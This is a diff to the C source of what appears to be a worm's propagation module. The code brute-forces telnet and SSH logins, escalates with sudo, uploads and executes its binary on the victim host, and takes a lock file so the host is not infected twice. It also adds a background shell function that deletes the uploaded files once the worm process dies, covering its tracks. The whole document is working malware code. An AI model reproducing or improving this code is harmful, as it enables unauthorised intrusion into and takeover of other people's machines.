@@ -47,6 +47,7 @@ static const size_t BNE_STDIO_IB_SIZE[] = {
 #define BNE_AVAIL_CMD_CAT		0x02
 #define BNE_AVAIL_CMD_DD		0x04
 #define BNE_AVAIL_CMD_BASE64	0x08
+#define BNE_AVAIL_CMD_SLEEP		0x10
 
 
 struct prne_bne {
@@ -110,6 +111,8 @@ typedef struct {
 	char *org_id;
 	uint8_t buf[2048];
 	char *upload_dir;
+	char *lockfile;
+	bool has_lock;
 	pth_event_t ev;
 	prne_iobuf_t ib;
 	prne_llist_t up_loc; // series of null-terminated string
@@ -197,6 +200,7 @@ static void bne_free_sh_ctx (bne_sh_ctx_t *p) {
 	prne_free_llist(&p->up_loc);
 	prne_free_llist(&p->up_methods);
 	prne_free(p->upload_dir);
+	prne_free(p->lockfile);
 	pth_event_free(p->ev, FALSE);
 	prne_free_bin_rcb_ctx(&p->rcb);
 
@@ -757,25 +761,33 @@ END:
 	return ret;
 }
 
-static bool bne_sh_sync (bne_sh_ctx_t *s_ctx) {
+static bool bne_sh_runcmd (bne_sh_ctx_t *s_ctx, const char *cmd) {
 	bne_sh_parser_t parser;
+	bool ret;
 
-	parser.ctx = NULL;
-	parser.line_f = NULL;
-	return bne_sh_runcmd_line(s_ctx, &parser, NULL);
+	bne_init_sh_parser(&parser);
+	ret = bne_sh_runcmd_line(s_ctx, &parser, cmd);
+	bne_free_sh_parser(&parser);
+	return ret;
+}
+
+static bool bne_sh_sync (bne_sh_ctx_t *s_ctx) {
+	return bne_sh_runcmd(s_ctx, NULL);
 }
 
 static int bne_sh_get_uid (bne_sh_ctx_t *s_ctx) {
 	bne_sh_parser_t parser;
 	int uid = 0;
 
+	bne_init_sh_parser(&parser);
 	parser.ctx = &uid;
 	parser.line_f = bne_sh_int_parse_f;
 
 	if (!bne_sh_runcmd_line(s_ctx, &parser, "id -u;")) {
-		return -1;
+		uid = -1;
 	}
 
+	bne_free_sh_parser(&parser);
 	return uid;
 }
 
@@ -856,6 +868,9 @@ static void bne_sh_availcmd_parse_f (void *ctx, char *line) {
 	}
 	else if (sscanf(line, "base64: %d", &ec) == 1 && ec < 127) {
 		s_ctx->avail_cmds |= BNE_AVAIL_CMD_BASE64;
+	}
+	else if (sscanf(line, "sleep: %d", &ec) == 1 && ec < 127) {
+		s_ctx->avail_cmds |= BNE_AVAIL_CMD_SLEEP;
 	}
 }
 
@@ -985,13 +1000,8 @@ static void bne_sh_cpuinfo_parse_f (void *ctx_p, char *line) {
 *	- Wait for prompt //.*:
 *	- Type password
 * 2. Check available commands
-*	- echo
-*	- cat
-*	- dd
-*	- base64
-*	- touch
-*	(if echo and cat not available, give up)
-* 3. Find a suitable mount point for upload
+* 3. Define shell functions
+* 4. Find a suitable mount point for upload
 *	- read /proc/mounts
 *	- filter out ro, non-ephemeral fs
 *	- prioritise:
@@ -1000,15 +1010,48 @@ static void bne_sh_cpuinfo_parse_f (void *ctx_p, char *line) {
 *		/dev/shm: 2
 *		/dev: 1
 *		(other): 0
-* 4. Determine arch
+* 5. Determine arch
 */
 static bool bne_sh_setup (
 	prne_bne_t *ctx,
 	bne_sh_ctx_t *s_ctx)
 {
+#define AVAILCMD_CMD\
+	"echo 2> /dev/null > /dev/null; echo echo: $?;"\
+	"echo | cat 2> /dev/null > /dev/null; echo cat: $?;"\
+	"echo | dd 2> /dev/null > /dev/null; echo dd: $?;"\
+	"echo | base64 2> /dev/null > /dev/null; echo base64: $?;"\
+	"echo | sleep 0 2> /dev/null > /dev/null; echo sleep: $?;"
+	// "echo | wc 2> /dev/null > /dev/null; echo wc: $?;"
+/* The upload guard shell functions
+*
+* - Clean up all files and exit when the process dies
+* - Just exit when the process is still running and the upload directory or the
+*   lock file is no longer present
+*
+* Shell
+*/
+#define UPLOAD_GUARD_F\
+	"prne_upload_guard () { "\
+		"while [ true ]; do "\
+			"sleep 1;"\
+			"if ! kill -0 $1; then "\
+				"rm -rf \"$2\" \"$3\";"\
+				"break;"\
+			"elif [ ! -e \"$2\" ] || [ ! -e \"$3\" ]; then "\
+				"break;"\
+			"fi;"\
+		"done;"\
+	" };"\
+/* Usage: prne_start_ug <shell pid> <upload dir> <lock file>*/\
+	"prne_start_ug () { "\
+		"prne_upload_guard \"$1\" \"$2\" \"$3\"&"\
+	" };"
+	prne_static_assert(
+		sizeof(AVAILCMD_CMD) < 512 && sizeof(UPLOAD_GUARD_F) < 512,
+		"This can overflow in old systems");
 	bool ret = false;
 	char *mp;
-	pth_event_t ev = NULL;
 	int uid;
 	bne_mp_t *mp_arr = NULL;
 	size_t mp_cnt = 0;
@@ -1029,27 +1072,32 @@ static bool bne_sh_setup (
 		char *cmd = prne_build_str(sb, sizeof(sb)/sizeof(const char*));
 
 		if (cmd == NULL) {
+			ctx->result.err = errno;
 			goto END;
 		}
 		ret = bne_sh_send(s_ctx, cmd);
 		prne_free(cmd);
 
 		if (!ret) {
+			ctx->result.err = errno;
 			goto END;
 		}
 	}
 
 	// Skip motd
 	if (!s_ctx->flush_f(s_ctx->ctx)) {
+		ctx->result.err = errno;
 		goto END;
 	}
 	if (!bne_sh_sync(s_ctx)) {
+		ctx->result.err = errno;
 		goto END;
 	}
 
 	// Check uid
 	uid = bne_sh_get_uid(s_ctx);
 	if (uid < 0) {
+		ctx->result.err = errno;
 		goto END;
 	}
 	if (uid != 0) {
@@ -1063,6 +1111,7 @@ static bool bne_sh_setup (
 
 		if (!bne_sh_sudo(ctx, s_ctx)) {
 			// sudo failed. no point infecting unprivileged machine
+			ctx->result.err = errno;
 			if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_ERR) {
 				prne_dbgpf(
 					"bne sh@%"PRIxPTR"\t: sudo failed\n",
@@ -1070,6 +1119,13 @@ static bool bne_sh_setup (
 			}
 			goto END;
 		}
+	}
+
+	// Define upload guard function
+	ret = bne_sh_runcmd(s_ctx, UPLOAD_GUARD_F);
+	if (!ret) {
+		ctx->result.err = errno;
+		goto END;
 	}
 
 	bne_free_sh_parser(&parser);
@@ -1083,12 +1139,9 @@ static bool bne_sh_setup (
 	ret = bne_sh_runcmd_line(
 		s_ctx,
 		&parser,
-		"echo 2> /dev/null > /dev/null; echo echo: $?;"
-		"echo | cat 2> /dev/null > /dev/null; echo cat: $?;"
-		"echo | dd 2> /dev/null > /dev/null; echo dd: $?;"
-		"echo | base64 2> /dev/null > /dev/null; echo base64: $?;"
-		"echo | wc 2> /dev/null > /dev/null; echo wc: $?;");
+		AVAILCMD_CMD);
 	if (!ret) {
+		ctx->result.err = errno;
 		goto END;
 	}
 	if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0 + 2) {
@@ -1106,6 +1159,9 @@ static bool bne_sh_setup (
 		}
 		if (s_ctx->avail_cmds & BNE_AVAIL_CMD_BASE64) {
 			prne_dbgpf("base64 ");
+		}
+		if (s_ctx->avail_cmds & BNE_AVAIL_CMD_SLEEP) {
+			prne_dbgpf("sleep ");
 		}
 		prne_dbgpf("\n");
 	}
@@ -1134,6 +1190,7 @@ static bool bne_sh_setup (
 		mpc.s_ctx = s_ctx;
 
 		if (!bne_sh_runcmd_line(s_ctx, &parser, "cat /proc/mounts;")) {
+			ctx->result.err = errno;
 			goto END;
 		}
 		if (mpc.err != 0) {
@@ -1194,6 +1251,7 @@ static bool bne_sh_setup (
 			mp_arr[j].path = NULL;
 		}
 		else {
+			ctx->result.err = errno;
 			goto END;
 		}
 	}
@@ -1243,6 +1301,7 @@ static bool bne_sh_setup (
 			parser.line_f = bne_sh_cpuinfo_parse_f;
 
 			if (!bne_sh_runcmd_line(s_ctx, &parser, "cat /proc/cpuinfo;")) {
+				ctx->result.err = errno;
 				goto END;
 			}
 
@@ -1315,18 +1374,15 @@ static bool bne_sh_setup (
 	ret = ctx->result.bin_host.arch != PRNE_ARCH_NONE;
 
 END: // CATCH
-	if (!ret && ctx->result.err == 0) {
-		ctx->result.err = errno;
-	}
-
 	bne_free_sh_parser(&parser);
 	for (size_t i = 0; i < mp_cnt; i += 1) {
 		prne_free(mp_arr[i].path);
 	}
 	prne_free(mp_arr);
-	pth_event_free(ev, FALSE);
 
 	return ret;
+#undef AVAILCMD_CMD
+#undef UPLOAD_GUARD_F
 }
 
 static bool bne_sh_start_rcb (prne_bne_t *ctx, bne_sh_ctx_t *sh_ctx) {
@@ -1355,6 +1411,9 @@ static bool bne_sh_start_rcb (prne_bne_t *ctx, bne_sh_ctx_t *sh_ctx) {
 			}
 		}
 		else {
+			if (ctx->result.prc == PRNE_PACK_RC_ERRNO) {
+				ctx->result.err = errno;
+			}
 			prne_dbgpf(
 				"bne sh@%"PRIxPTR"\t: prne_start_bin_rcb_compat() - %s\n",
 				(uintptr_t)ctx,
@@ -1365,13 +1424,34 @@ static bool bne_sh_start_rcb (prne_bne_t *ctx, bne_sh_ctx_t *sh_ctx) {
 	return ctx->result.prc == PRNE_PACK_RC_OK;
 }
 
-/*
-* When upload fails
-*/
-static bool bne_sh_cleanup_upload (
-	prne_bne_t *ctx,
-	bne_sh_ctx_t *s_ctx)
-{
+static bool bne_sh_start_ug (bne_sh_ctx_t *sh_ctx) {
+	const char *sb[] = {
+		"prne_start_ug $$ \"",
+		sh_ctx->upload_dir, "\" \"",
+		sh_ctx->lockfile, "\"&"
+	};
+	char *cmd;
+	bool ret;
+
+	if (sh_ctx->upload_dir == NULL ||
+		(sh_ctx->avail_cmds & BNE_AVAIL_CMD_SLEEP) == 0)
+	{
+		return true;
+	}
+
+	cmd = prne_build_str(sb, sizeof(sb)/sizeof(const char*));
+	if (cmd != NULL) {
+		ret = bne_sh_runcmd(sh_ctx, cmd);
+	}
+	else {
+		ret = false;
+	}
+	prne_free(cmd);
+
+	return ret;
+}
+
+static bool bne_sh_cleanup_upload (bne_sh_ctx_t *s_ctx) {
 	bool ret = false;
 	char *cmd = NULL;
 	const char *sb[] = {
@@ -1392,7 +1472,7 @@ static bool bne_sh_cleanup_upload (
 	ret = bne_sh_send(s_ctx, cmd);
 	prne_free(cmd);
 
-	return bne_sh_sync(s_ctx) && ret;
+	return ret;
 }
 
 static bool bne_sh_prep_upload (
@@ -1420,7 +1500,7 @@ static bool bne_sh_prep_upload (
 	prne_uuid_tostr(uuid, uuid_str);
 
 //TRY
-	if (!bne_sh_cleanup_upload(ctx, s_ctx)) {
+	if (!bne_sh_cleanup_upload(s_ctx)) {
 		goto END;
 	}
 	if (!bne_sh_start_rcb(ctx, s_ctx)) {
@@ -1465,7 +1545,7 @@ static bool bne_sh_prep_upload (
 END:
 	prne_free(cmd);
 	bne_free_sh_parser(&parser);
-	return bne_sh_sync(s_ctx) && ret;
+	return ret && bne_sh_start_ug(s_ctx);
 }
 
 static bool bne_sh_upload_echo (
@@ -1646,7 +1726,7 @@ END:
 #undef BPC
 }
 
-static bool bne_sh_run_exec (
+static int bne_sh_run_exec (
 	prne_bne_t *ctx,
 	bne_sh_ctx_t *s_ctx,
 	const char *exec)
@@ -1657,19 +1737,20 @@ static bool bne_sh_run_exec (
 		"\"", s_ctx->org_id, "\"",
 		";echo $?;"
 	};
-	char *cmd;
+	char *cmd = NULL;
 	bne_sh_parser_t parser;
 	int ec = -1;
-	bool ret = false;
+	int ret = -1;
 
 	bne_init_sh_parser(&parser);
 	parser.ctx = &ec;
 	parser.line_f = bne_sh_int_parse_f;
 
+// TRY
 	cmd = prne_build_str(sb_cmd, sizeof(sb_cmd)/sizeof(const char*));
 	if (cmd == NULL) {
 		ctx->result.err = errno;
-		return false;
+		goto END;
 	}
 
 	if (bne_sh_runcmd_line(s_ctx, &parser, cmd)) {
@@ -1683,8 +1764,7 @@ static bool bne_sh_run_exec (
 		switch (ec) {
 		case PRNE_PROONE_EC_OK: // successful launch
 			ctx->result.ny_instance = true;
-			ret = true;
-			break;
+			/* fall-through */
 		case PRNE_PROONE_EC_LOCK:
 			/*
 			* failed to acquire lock
@@ -1694,17 +1774,20 @@ static bool bne_sh_run_exec (
 			* delete the upload dir so the mount point doesn't get stuffed up
 			* with temp dirs
 			*/
-			bne_sh_cleanup_upload(ctx, s_ctx);
-			ret = true;
+			ret = 1;
 			break;
+		default:
+			ret = 0;
 		}
 	}
 
+END:
+	bne_free_sh_parser(&parser);
 	prne_free(cmd);
 	return ret;
 }
 
-static void bne_build_host_cred (
+static void bne_sh_build_host_cred (
 	bne_sh_ctx_t *s_ctx,
 	char *id,
 	char *pw)
@@ -1737,7 +1820,7 @@ END:
 	prne_free(m);
 }
 
-static void bne_build_org_id (bne_sh_ctx_t *s_ctx, const uint8_t *id) {
+static void bne_sh_build_org_id (bne_sh_ctx_t *s_ctx, const uint8_t *id) {
 	size_t olen;
 
 	prne_free(s_ctx->org_id);
@@ -1754,20 +1837,139 @@ static void bne_build_org_id (bne_sh_ctx_t *s_ctx, const uint8_t *id) {
 	mbedtls_base64_encode((unsigned char*)s_ctx->org_id, olen, &olen, id, 16);
 }
 
+static const char *bne_sh_build_lockfile (
+	bne_sh_ctx_t *s_ctx,
+	const char *mp,
+	const char *name)
+{
+	const char *sb[] = { mp, "/.", name };
+
+	s_ctx->lockfile = prne_rebuild_str(
+		s_ctx->lockfile,
+		sb,
+		sizeof(sb)/sizeof(const char*));
+	return s_ctx->lockfile;
+}
+
+static bool bne_sh_rm_lockfile (bne_sh_ctx_t *sh_ctx) {
+	bool ret;
+
+	if (sh_ctx->lockfile != NULL && sh_ctx->has_lock) {
+		const char *sb[] = {
+			"rm -f \"", sh_ctx->lockfile, "\";"
+		};
+		char *cmd = prne_build_str(sb, sizeof(sb)/sizeof(const char*));
+
+		if (cmd != NULL) {
+			ret = bne_sh_runcmd(sh_ctx, cmd);
+		}
+		else {
+			ret = false;
+		}
+		prne_free(cmd);
+	}
+	else {
+		ret = true;
+	}
+
+	sh_ctx->has_lock = false;
+	prne_free(sh_ctx->lockfile);
+	sh_ctx->lockfile = NULL;
+	return ret;
+}
+
+/*
+* \return -1: syscall error
+* \return 0: lock exists
+* \return 1: lock acquired
+* \return 2: shell error (continue anyway)
+*/
+static int bne_sh_mk_lockfile (
+	bne_sh_ctx_t *sh_ctx,
+	const char *mp,
+	const char *lock_name)
+{
+	char *cmd = NULL;
+	int ret = -1, ec = -1;
+	bne_sh_parser_t parser;
+
+	bne_init_sh_parser(&parser);
+	parser.ctx = &ec;
+	parser.line_f = bne_sh_int_parse_f;
+
+// TRY
+	if (!bne_sh_rm_lockfile(sh_ctx)) {
+		goto END;
+	}
+
+	if (bne_sh_build_lockfile(sh_ctx, mp, lock_name) != NULL) {
+/* This is not a good locking mechanism
+*
+* The perfect mechanism would be...
+```
+umask 0377
+if echo -n > "$LOCKFILE"; then
+	echo "Lock acquired"
+fi
+```
+* But this wouldn't work here because root bypasses file modes(the sesion is
+* escalated in bne_sh_setup())
+*/
+		const char *sb[] = {
+			"if [ -f \"", sh_ctx->lockfile, "\" ]; then "
+				"EC=1;"
+			"else "
+				"echo -n > \"", sh_ctx->lockfile, "\";"
+				"EC=$?;"
+			"fi;"
+			"echo $EC;"
+		};
+
+		cmd = prne_rebuild_str(cmd, sb, sizeof(sb)/sizeof(const char*));
+		if (cmd == NULL) {
+			goto END;
+		}
+	}
+	else {
+		goto END;
+	}
+	if (!bne_sh_runcmd_line(sh_ctx, &parser, cmd)) {
+		goto END;
+	}
+	ret = ec == 0 ? 1 : 0;
+	if (ret > 0) {
+		sh_ctx->has_lock = true;
+	}
+
+END:
+	bne_free_sh_parser(&parser);
+	prne_free(cmd);
+	return ret;
+}
+
 static bool bne_do_shell (prne_bne_t *ctx, bne_sh_ctx_t *sh_ctx) {
 	bool alloc;
 	bool ret = false;
 	char *exec_name = NULL;
+	char *lock_name = NULL;
 	bne_sh_upload_ft upload_f;
+	int f_ret = 0;
 
 // TRY
-	bne_build_host_cred(sh_ctx, ctx->result.cred.id, ctx->result.cred.pw);
-	bne_build_org_id(sh_ctx, ctx->param.org_id);
+	bne_sh_build_host_cred(sh_ctx, ctx->result.cred.id, ctx->result.cred.pw);
+	bne_sh_build_org_id(sh_ctx, ctx->param.org_id);
 
 	exec_name = ctx->param.cb.exec_name(ctx->param.cb_ctx);
 	if (exec_name == NULL) {
 		ctx->result.err = errno;
 		goto END;
+	}
+	if (ctx->param.cb.bne_lock_name != NULL) {
+		lock_name = ctx->param.cb.bne_lock_name(ctx->param.cb_ctx);
+		if (lock_name == NULL) {
+			ctx->result.err = errno;
+			goto END;
+		}
 	}
 
 	if (!bne_sh_setup(ctx, sh_ctx)) {
@@ -1806,32 +2008,48 @@ static bool bne_do_shell (prne_bne_t *ctx, bne_sh_ctx_t *sh_ctx) {
 		{
 			upload_f = (bne_sh_upload_ft)e_met->element;
 
+			if (lock_name != NULL) {
+				f_ret = bne_sh_mk_lockfile(sh_ctx, mp, lock_name);
+				if (f_ret < 0) {
+					ctx->result.err = errno;
+					goto END;
+				}
+				if (f_ret == 0) {
+					ret = true;
+					goto END;
+				}
+			}
+
 			ret = bne_sh_prep_upload(
 				ctx,
 				sh_ctx,
 				mp,
 				exec_name,
 				"700");
-			if (ret) {
-				ret =
-					upload_f(ctx, sh_ctx, exec_name) &&
-					bne_sh_run_exec(ctx, sh_ctx, exec_name);
-
-				if (ret) {
-					goto END;
-				}
-				if (!bne_sh_cleanup_upload(ctx, sh_ctx)) {
-					goto END;
-				}
+			if (!ret) {
+				ctx->result.err = errno;
+				goto END;
 			}
-			else {
+
+			ret = upload_f(ctx, sh_ctx, exec_name);
+			if (!ret) {
+				goto END;
+			}
+			f_ret = bne_sh_run_exec(ctx, sh_ctx, exec_name);
+			ret = f_ret > 0;
+			if (f_ret != 0) {
 				goto END;
 			}
 		}
 	}
 
 END: // CATCH
+	if (f_ret >= 0) {
+		bne_sh_cleanup_upload(sh_ctx);
+		bne_sh_rm_lockfile(sh_ctx);
+	}
 	prne_free(exec_name);
+	prne_free(lock_name);
 
 	return ret;
 }
@@ -2531,6 +2749,9 @@ static bool bne_do_vec_htbt (prne_bne_t *ctx) {
 	}
 
 END: // CATCH
+	if (!ret) {
+		ctx->result.err = errno;
+	}
 	prne_free_iobuf(&vctx.netib);
 	prne_free_iobuf(&vctx.stdioib);
 	mbedtls_ssl_free(&vctx.ssl);
@@ -3227,7 +3448,7 @@ static bool bne_vtn_login (prne_bne_t *ctx, bne_vtn_ctx_t *t_ctx) {
 
 		if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0 + 1) {
 			prne_dbgpf(
-				"bne vssh@%"PRIxPTR"\t: trying cred %s %s\n",
+				"bne vtn@%"PRIxPTR"\t: trying cred %s %s\n",
 				(uintptr_t)ctx,
 				ctx->result.cred.id,
 				ctx->result.cred.pw);
@@ -3662,6 +3883,10 @@ static ssize_t bne_vssh_read_f (
 		}
 
 		if (ret > 0) {
+/* Prioritise process of stderr data first to swiftly break from the normal
+* flow. It also helps to intentionally congest the stdout buffer so that the
+* process blocks on write() call.
+*/
 			break;
 		}
 
@@ -3741,39 +3966,19 @@ static ssize_t bne_vssh_write_f (
 	return sent;
 }
 
-#if 0 // this works
-static int bne_vssh_pollin_f (void *ctx_p) {
-	bne_vssh_ctx_t *ctx = (bne_vssh_ctx_t*)ctx_p;
-	ssize_t f_ret;
-
-	f_ret = libssh2_channel_read_stderr(ctx->ch_shell, NULL, 0);
-	if (f_ret == 0) {
-		return 1;
-	}
-	else if (f_ret < 0 && f_ret != LIBSSH2_ERROR_EAGAIN) {
-		return -1;
-	}
-
-	f_ret = libssh2_channel_read(ctx->ch_shell, NULL, 0);
-	if (f_ret == 0) {
-		return 1;
-	}
-	else if (f_ret < 0 && f_ret != LIBSSH2_ERROR_EAGAIN) {
-		return -1;
-	}
-
-	return 0;
-}
-#endif
-
 static bool bne_vssh_flush_f (void *ctx_p) {
 	bne_vssh_ctx_t *ctx = (bne_vssh_ctx_t*)ctx_p;
 	int f_ret;
 
 	f_ret = libssh2_channel_flush_ex(ctx->ch_shell, LIBSSH2_CHANNEL_FLUSH_ALL);
-	return
-		(f_ret == 0) ||
-		(f_ret < 0 && f_ret == LIBSSH2_ERROR_EAGAIN);
+
+	if (f_ret >= 0) {
+		return true;
+	}
+	if (f_ret < 0 && f_ret == LIBSSH2_ERROR_EAGAIN) {
+		return true;
+	}
+	return false;
 }
 
 static bool bne_vssh_do_shell (prne_bne_t *ctx, bne_vssh_ctx_t *vs) {
